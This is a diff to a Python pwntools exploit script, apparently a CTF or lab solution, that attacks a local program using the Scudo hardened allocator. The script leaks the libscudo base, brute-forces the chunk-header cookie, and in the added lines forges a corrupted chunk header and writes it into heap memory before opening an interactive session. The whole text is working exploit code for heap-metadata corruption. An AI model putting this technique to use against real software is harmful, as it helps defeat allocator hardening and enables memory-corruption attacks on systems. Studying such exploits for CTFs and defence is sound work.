@@ -30,8 +30,6 @@ def start():
         return gdb.debug(elf.path, gdbscript=gs, env=env)
     else:
         return process(elf.path, env=env, stdin=PTY)
-
-# Select the "malloc" option, send size & data.
    
 io = start()
 
@@ -50,7 +48,8 @@ info(f"address 1: {hex(add1)} address 2: {hex(add2)}")
 write(io, add1, b"X"*12)
 write(io, add2, b"Y"*12)
 
-scudo_base = get_libscudo_base(io)
+scudo_base = get_libscudo_base(io, SCUDO_LIB)
+
 info(f"lib-scudo base: {hex(scudo_base)}")
 
 cookie_cheat = get_cookie_cheat(io, scudo_base)
@@ -58,6 +57,14 @@ info(f"cheated cookie: {hex(cookie_cheat)}")
 cookie = bruteforce_cookie(io, add1)
 
 info(f"Bruteforced cookie: {hex(cookie)}")
+
+# mess with the chunk header at add2
+
+new_header = 0x8101
+forged_header = forge_header(add2, cookie_cheat, new_header)
+info("writing!!!!")
+write(io, add2-0x10, forged_header)
+
 
 io.interactive()
 
